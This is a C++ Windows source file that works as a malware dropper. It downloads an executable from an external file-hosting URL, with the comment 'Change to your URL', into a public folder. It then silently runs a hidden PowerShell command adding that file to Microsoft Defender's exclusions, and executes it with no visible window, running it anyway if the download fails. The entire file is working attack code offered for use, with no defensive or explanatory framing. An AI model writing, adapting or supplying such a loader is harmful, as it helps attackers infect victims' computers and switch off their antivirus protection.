#include <windows.h>
#include <urlmon.h>
#include <iostream>
#include <string>
#include <vector>
#include <random>
#include <algorithm>

// Helper to run commands silently
void runCommandSilent(const std::string& cmd) {
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE; // Hide the console window
    ZeroMemory(&pi, sizeof(pi));

    // CreateProcessA expects LPSTR (char*), so we use const_cast
    if (CreateProcessA(
        NULL,                    // Application name
        const_cast<char*>(cmd.c_str()), // Command line
        NULL,                    // Process handle not inheritable
        NULL,                    // Thread handle not inheritable
        FALSE,                   // Set handle inheritance to FALSE
        CREATE_NO_WINDOW,        // Creation flags
        NULL,                    // Use parent's environment block
        NULL,                    // Use parent's starting directory 
        &si,                     // Pointer to STARTUPINFO structure
        &pi                    // Pointer to PROCESS_INFORMATION structure
    )) {
        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
}

int main() {
    // 1. Download Payload
    HRESULT hr = URLDownloadToFileW(
        NULL, 
        L"https://catbox.moe/your_file_here.exe", // Change to your URL
        L"C:\\Users\\Public\\payload.exe",       // Save location
        0, 
        NULL
    );

    if (hr == S_OK) {
        std::cout << "Payload downloaded successfully." << std::endl;
        
        // Define the command ONCE here
        std::string cmd = "powershell.exe -WindowStyle Hidden -Command \"Add-MpPreference -ExclusionProcess 'C:\\Users\\Public\\payload.exe'\"";
        
        // Run the exclusion command
        runCommandSilent(cmd);

        // 2. Run Payload
        STARTUPINFOA si;
        PROCESS_INFORMATION pi;
        ZeroMemory(&si, sizeof(si));
        si.cb = sizeof(si);
        si.dwFlags = STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_HIDE;
        ZeroMemory(&pi, sizeof(pi));

        // Define the payload path ONCE here
        std::string payloadPath = "C:\\Users\\Public\\payload.exe";

        if (CreateProcessA(
            NULL, 
            const_cast<char*>(payloadPath.c_str()), // Cast to LPSTR
            NULL, 
            NULL, 
            FALSE, 
            CREATE_NO_WINDOW, 
            NULL, 
            NULL, 
            &si, 
            &pi
        )) {
            std::cout << "Payload executed." << std::endl;
            WaitForSingleObject(pi.hProcess, 5000); // Wait 5 seconds
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
        } else {
            std::cout << "Failed to execute payload. Error: " << GetLastError() << std::endl;
        }

    } else {
        std::cout << "Download failed or file already exists." << std::endl;
        // Fallback: Try to run if it exists anyway
        std::string payloadPath = "C:\\Users\\Public\\payload.exe";
        runCommandSilent(payloadPath);
    }

    return 0;
}